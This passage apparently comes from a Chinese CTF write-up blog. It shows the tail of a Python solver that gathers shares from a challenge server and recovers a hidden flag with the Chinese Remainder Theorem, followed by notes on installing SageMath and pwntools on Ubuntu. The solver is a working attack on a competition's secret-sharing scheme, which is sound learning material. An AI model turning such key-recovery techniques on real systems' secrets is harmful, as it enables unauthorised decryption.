</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error on connection </span><span class=si>{</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=c1># If a connection fails, try again</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>-=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>list1</span><span class=p>,</span> <span class=n>list2</span><span class=p>,</span> <span class=n>list3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_crt</span><span class=p>(</span><span class=n>lista</span><span class=p>,</span> <span class=n>list_share</span><span class=p>,</span> <span class=n>list_y</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Solve using Chinese Remainder Theorem&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Collected moduli:&#39;</span><span class=p>,</span> <span class=n>lista</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Collected shares:&#39;</span><span class=p>,</span> <span class=n>list_share</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;Collected values:&#39;</span><span class=p>,</span> <span class=n>list_y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Prepare for CRT</span>
</span></span><span class=line><span class=cl>    <span class=n>moduli</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>residues</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>lista</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=c1># First modulus and residue</span>
</span></span><span class=line><span class=cl>        <span class=n>moduli</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>lista</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>residues</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>list_y</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>%</span> <span class=n>lista</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Second modulus and residue from shares</span>
</span></span><span class=line><span class=cl>        <span class=n>moduli</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>list_share</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>residues</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>list_y</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>%</span> <span class=n>list_share</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Use SymPy&#39;s CRT implementation</span>
</span></span><span class=line><span class=cl>    <span class=n>s_rec</span><span class=p>,</span> <span class=n>mod</span> <span class=o>=</span> <span class=n>crt</span><span class=p>(</span><span class=n>moduli</span><span class=p>,</span> <span class=n>residues</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Recovered value:&#34;</span><span class=p>,</span> <span class=n>s_rec</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Modulus:&#34;</span><span class=p>,</span> <span class=n>mod</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Bit length:&#34;</span><span class=p>,</span> <span class=n>s_rec</span><span class=o>.</span><span class=n>bit_length</span><span class=p>())</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s_rec</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>int_to_bytes</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Convert an integer to bytes&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Calculate the number of bytes needed</span>
</span></span><span class=line><span class=cl>    <span class=n>num_bytes</span> <span class=o>=</span> <span class=p>(</span><span class=n>n</span><span class=o>.</span><span class=n>bit_length</span><span class=p>()</span> <span class=o>+</span> <span class=mi>7</span><span class=p>)</span> <span class=o>//</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=c1># Convert to bytes</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>n</span><span class=o>.</span><span class=n>to_bytes</span><span class=p>(</span><span class=n>num_bytes</span><span class=p>,</span> <span class=n>byteorder</span><span class=o>=</span><span class=s1>&#39;big&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>extract_flag</span><span class=p>(</span><span class=n>s_rec</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Try to extract the flag from the recovered integer&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># Convert to bytes and try to decode</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>bytes_data</span> <span class=o>=</span> <span class=n>int_to_bytes</span><span class=p>(</span><span class=n>s_rec</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># Look for flag pattern (usually starts with &#34;flag{&#34; or &#34;CTF{&#34; etc.)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Raw bytes:&#34;</span><span class=p>,</span> <span class=n>bytes_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># Try to find flag format in the bytes</span>
</span></span><span class=line><span class=cl>        <span class=n>flag_formats</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s2>&#34;flag{&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;CTF{&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;b01lers{&#34;</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;{&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>format_start</span> <span class=ow>in</span> <span class=n>flag_formats</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>format_start</span> <span class=ow>in</span> <span class=n>bytes_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>start_idx</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=o>.</span><span class=n>index</span><span class=p>(</span><span class=n>format_start</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>end_idx</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;}&#34;</span><span class=p>,</span> <span class=n>start_idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>end_idx</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>flag</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=p>[</span><span class=n>start_idx</span><span class=p>:</span><span class=n>end_idx</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># If no specific format found, try to decode the whole thing</span>
</span></span><span class=line><span class=cl>        <span class=n>text</span> <span class=o>=</span> <span class=n>bytes_data</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;replace&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Possible text:&#34;</span><span class=p>,</span> <span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>text</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error extracting flag: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=c1># If data is already collected, you can use these values directly</span>
</span></span><span class=line><span class=cl>    <span class=n>use_existing_data</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>use_existing_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Use data from paste.txt</span>
</span></span><span class=line><span class=cl>        <span class=n>lista</span> <span class=o>=</span> <span class=p>[</span><span class=mi>17584271476152388921</span><span class=p>,</span> <span class=mi>17370971913569156569</span><span class=p>,</span> <span class=mi>14959881750433329757</span><span class=p>,</span> <span class=mi>10303284208185415327</span><span class=p>,</span> <span class=mi>15713836054255673819</span><span class=p>,</span> <span class=mi>17478696318611502361</span><span class=p>,</span> <span class=mi>13098744946226139623</span><span class=p>,</span> <span class=mi>16955666992762514789</span><span class=p>,</span> <span class=mi>17400563056979005187</span><span class=p>,</span> <span class=mi>14895399098388854051</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>list_share</span> <span class=o>=</span> <span class=p>[</span><span class=mi>11741896534246295149</span><span class=p>,</span> <span class=mi>13766271162016128403</span><span class=p>,</span> <span class=mi>10298792465391901379</span><span class=p>,</span> <span class=mi>14589861000287547127</span><span class=p>,</span> <span class=mi>12032587407650034763</span><span class=p>,</span> <span class=mi>9331719354810106693</span><span class=p>,</span> <span class=mi>12770590820017684649</span><span class=p>,</span> <span class=mi>17590033785618719651</span><span class=p>,</span> <span class=mi>16632024631370273077</span><span class=p>,</span> <span class=mi>10007219471876742649</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>list_y</span> <span class=o>=</span> <span class=p>[</span><span class=mi>51843339894594430511477195106634838415638423651817345596930708154547607313815854908867159440180095110807056026755477215148658767518973886701971682981971698070886828657868708218128273453096554066889881030942772341797102680463254274525036512657451791011268688507325492061926521631418195012504316928272412909669981049904288688034182493923608563142984021256164664586268938761418848942676317656829645433788</span><span class=p>,</span> <span class=mi>1246031746311153323831712591179734709121040796146740611030096526123136613851005484759820414334167089647250156832731764720104684477914477546125008723501583621293856087734300405341615956996568685700895087782523748542475102009193735305723327432087609311672451839655152530184580649757651013057814374397429832901072912460341941161988857876228996923725224757287359075236096883072541212487826763103094467968944</span><span class=p>,</span> <span class=mi>2976917307927483897052196616220801579678017487577896522257147674095125892345998018975090960303886771850202764080875397609058749896148840816580947391250338467221900831332931327058678022137072037183465174212043487736030921701757454999127608616347447380055325113542425043565916486827644704707246128578693224099596425735337017386146569791176945041604880090970076987612684388204879088704994778888105750806</span><span class=p>,</span> <span class=mi>1384920290143909908703226936777372436793203522294243205025677290359643468639230135325162060558561635871272367231479723795564442951231283797561420265640290563328793048216492653316731045150925202366613437593854467629008532700105927129244361930444452740812988943385400738479709799144476592095539951839873084582384779454446586928688641189011644407608341499257343536310622826642258787819851949166122087619464</span><span class=p>,</span> <span class=mi>77241817152648679036231972429294381702393651163502639776475028556278336078725176354285891169808504597706435120497631907808191078467500267351562773580742866711192170466763167010364725911538367566790786304319325827797640425149645307778637299987507073880514696400936367265709777473436271936050054165525034796359654465264682869694793689146750180462558587623759040856393369789927015616607627437829132323850</span><span class=p>,</span> <span class=mi>764523548885397012320477471948825900475519103816830058192425565910781281025362579270437522402208334144043096499391518387471821322174434301591191559607903745441653957657494494698295996285278685232821131616090793202333953915035171732603609008507426267841013590563151434147187090943086119089003730864875039016683148871830631487711173159611710852455814649427907089482290408274624343455010944018166959770</span><span class=p>,</span> <span class=mi>144064658515512655454646089699499232876959749660149996792201127452076520727680704403115041652968546656996316495132812786824199544567757184512998593189233467404279565252769681617130103115729144564139986559855142514841881348216595471862046939657894817866717466853432775442688310214534025345071362743239270237405078941417424052063235842155831529311818745544527867448067954418262512424218218379214406774838</span><span class=p>,</span> <span class=mi>114957910927358084596779819001922125751235147058371444606117893010618320964248842209458123422144115068343176760022458967525514502402163926101959251740532506154262094489737142810526089718447412385747274784030948685071217358217592296955862493053541411378640519556277781185066480967318480849314979968291648064281823176303321907419421598875181169666096576945833833314304296556174806897434824087741286721782306</span><span class=p>,</span> <span class=mi>26275415397285928766829883853306258812955570979623237113362386122234764896982641278479326183973284914225272286574670408724799183857716979238511062439993912230446611526700137145672660600745354478158115958998871112985097032588208884363679339850077888692762877190865121787088158324570619255440483910750648497105857394477083740000090962639689152802633369136418680272407301238306216534747374823245370017819228</span><span class=p>,</span> <span class=mi>2297769956318797305100187036394309255007746600801751737436711883119976141694626009965570624872550636678566358956046808388673749895635919004020911477701400475529566504462292039389544415774119552552226091528204460545465400735225240665241177522414602867816613570324082145110138723981492497719672500202373827603548998896353923023211217307092006615272182696362812279754912012331963845255420844603374856288</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Collect new data from the server</span>
</span></span><span class=line><span class=cl>        <span class=n>lista</span><span class=p>,</span> <span class=n>list_share</span><span class=p>,</span> <span class=n>list_y</span> <span class=o>=</span> <span class=n>collect_data</span><span class=p>(</span><span class=mi>10</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Solve using CRT</span>
</span></span><span class=line><span class=cl>    <span class=n>s_rec</span> <span class=o>=</span> <span class=n>solve_crt</span><span class=p>(</span><span class=n>lista</span><span class=p>,</span> <span class=n>list_share</span><span class=p>,</span> <span class=n>list_y</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Extract the flag</span>
</span></span><span class=line><span class=cl>    <span class=n>flag</span> <span class=o>=</span> <span class=n>extract_flag</span><span class=p>(</span><span class=n>s_rec</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>flag</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag found:&#34;</span><span class=p>,</span> <span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag not found. Try decoding the raw bytes manually.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p>不过还是不太行，安装一下sagemath在我的Ubuntu20</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl># 安装依赖
</span></span><span class=line><span class=cl>sudo apt update
</span></span><span class=line><span class=cl>sudo apt install build-essential m4 dpkg-dev flex bison bc libssl-dev
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl># 下载SageMath源代码（将X.Y替换为你想要的版本，如9.5）
</span></span><span class=line><span class=cl>wget https://github.com/sagemath/sage/archive/9.3.tar.gz
</span></span><span class=line><span class=cl>tar -xvf 9.3.tar.gz
</span></span><span class=line><span class=cl>cd sage-9.3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>./configure
</span></span><span class=line><span class=cl>make
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>ls -l sage
</span></span><span class=line><span class=cl># 进入使用环境
</span></span><span class=line><span class=cl>./sage
</span></span></code></pre></td></tr></table></div></div><p>但是不是很方便每次必须进目录才可以使用，所以再搞个软链接</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo mkdir -p /opt/sage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sudo mv ~/Desktop/sage-9.3 /opt/sage/
</span></span><span class=line><span class=cl>sudo ln -s /opt/sage/sage-9.3/sage /usr/local/bin/sage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>which sage
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>sage --version
</span></span></code></pre></td></tr></table></div></div><p>装好了以后用，顺便给这台新的Ubuntu安装一个python3.10，避免以后忘了在这里写写利用命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>baozongw1</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>Desktop</span><span class=o>$</span> <span class=n>python3</span><span class=o>.</span><span class=mi>10</span> <span class=o>--</span><span class=n>version</span>
</span></span><span class=line><span class=cl><span class=n>Python</span> <span class=mf>3.10</span><span class=o>.</span><span class=mi>17</span>
</span></span><span class=line><span class=cl><span class=n>baozongw1</span><span class=err>@</span><span class=n>ubuntu</span><span class=p>:</span><span class=o>~/</span><span class=n>Desktop</span><span class=o>$</span> <span class=n>python3</span><span class=o>.</span><span class=mi>10</span> <span class=o>-</span><span class=n>m</span> <span class=n>pip</span> <span class=n>install</span> <span class=n>pwntools</span>
</span></span></code></pre></td></tr></table></div></div><p>用西瓜杯的<strong>Ezzz_php</strong>测试了一下，可以用的</p></section><footer class=article-footer><section class=article-tags><a href=/tags/jail/>Jail</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
2024 -
2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.7k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>